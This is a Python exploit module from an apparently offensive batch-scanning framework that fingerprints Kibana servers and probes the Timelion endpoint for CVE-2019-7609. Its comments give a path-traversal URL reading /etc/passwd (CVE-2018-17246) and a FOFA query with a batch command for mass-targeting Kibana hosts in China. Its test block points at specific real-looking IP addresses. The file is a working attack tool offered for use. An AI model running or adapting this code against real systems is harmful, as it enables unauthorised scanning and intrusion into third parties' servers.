# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# can getshell
# CVE-2019-7609
# http://ip:5601/app/timelion

# CVE-2018-17246
# http://ip:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd

# exec部分不知道什么原因不能利用
# fofa: app="elastic-Kibana" && country="CN"
# python batch.py -m exploit.web.Unauth.Kibana.Unauth -cs -fs "app=\"elastic-Kibana\" && country=\"CN\""

class Script(BaseScript):
    name = 'Kibana'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.FINGER and BugType.UNAUTH
        # 编号
        self.bugNumber = 'CVE-2019-7609'
        # 来源
        self.refer = 'https://github.com/LandGrey/CVE-2019-7609'
        # 特定路径判断
        self.detectPathList = ['/yunsee_not_found_test']
        # exec
        self.execPathList = ['/api/timelion/run']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = '''
        Kibana < 6.6.1
        Kibana < 5.6.15
        '''

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False, allow_redirects=False) as response:
                        await asyncio.sleep(2)
                        if response is not None and response.status == 302 and response.headers.get('kbn-name') == 'kibana':
                            self.flag = True
                            tqdm.write(Fore.RED + '[{}] {}'.format('Kibana Finger', url))
                            return {'name': 'Kibana Finger', 'url': url, 'software': 'Kibana'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        headers.update(
            {'Content-Type': 'application/json; charset=utf-8', 'Referer': f'http://{self.target}/app/timelion'})
        try:
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    data = '{"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}'
                    async with session.post(url=url, data=data, headers=headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                        if response is not None and response.status == 200:
                            text = await response.text()
                            await asyncio.sleep(2)
                            if '"seriesList"' in text:
                                tqdm.write(Fore.RED + '[{}] {}'.format('Kibana RCE', url))
                                return {'name': 'Kibana RCE', 'url': url, 'software': 'Kibana'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
